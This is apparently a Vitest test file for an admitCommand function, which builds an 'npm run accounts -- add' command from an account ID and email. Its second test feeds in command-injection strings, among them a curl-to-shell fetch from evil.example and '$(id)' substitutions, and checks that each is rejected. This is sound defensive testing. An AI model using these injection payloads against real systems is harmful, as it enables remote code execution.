import { describe, expect, it } from 'vitest';
import { admitCommand } from './admit';

describe('admitCommand', () => {
  it('adds the refused account to the list rather than replacing it', () => {
    expect(admitCommand({ sub: '104729384756102938475', email: 'friend@example.com' })).toBe(
      'npm run accounts -- add 104729384756102938475 friend@example.com'
    );
  });

  it('builds nothing a shell would read as more than two words', () => {
    const email = 'friend@example.com';
    for (const sub of ["1'; curl evil.example | sh; echo '", '1 2', '1\n2', '$(id)', 'abc', '']) {
      expect(admitCommand({ sub, email })).toBeNull();
    }
    for (const bad of ['a@b.co; id', 'a b@example.com', '$(id)@example.com', 'nobody']) {
      expect(admitCommand({ sub: '1', email: bad })).toBeNull();
    }
    expect(admitCommand(null)).toBeNull();
  });
});
